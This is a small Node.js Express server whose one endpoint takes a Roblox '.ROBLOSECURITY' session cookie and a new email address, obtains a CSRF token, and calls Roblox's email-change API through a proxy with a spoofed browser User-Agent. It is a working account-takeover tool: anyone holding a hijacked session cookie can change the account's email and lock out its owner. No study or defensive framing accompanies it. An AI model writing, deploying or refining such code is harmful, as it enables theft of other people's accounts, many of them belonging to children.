const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  next();
});

app.post('/api/reset-email', async (req, res) => {
  const { cookie, newEmail } = req.body;
  try {
    const csrfToken = await fetchCsrfToken(cookie);
    const response = await axios.post(
      'https://auth.roblox.com/v2/email/change',
      { newEmail },
      {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124',
          Cookie: `.ROBLOSECURITY=${cookie}`,
          'X-CSRF-TOKEN': csrfToken
        },
        proxy: { host: 'proxy_ip', port: 'port' } // Replace with valid proxy
      }
    );
    res.send('Email reset initiated for ' + newEmail);
  } catch (error) {
    res.status(500).send('Error: ' + error.response?.status + ' - ' + error.message);
  }
});

app.listen(3000, () => console.log('Server running on port 3000'));

async function fetchCsrfToken(cookie) {
  const response = await axios.get('https://www.roblox.com', { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } });
  return response.headers['x-csrf-token'] || 'default_token';
}
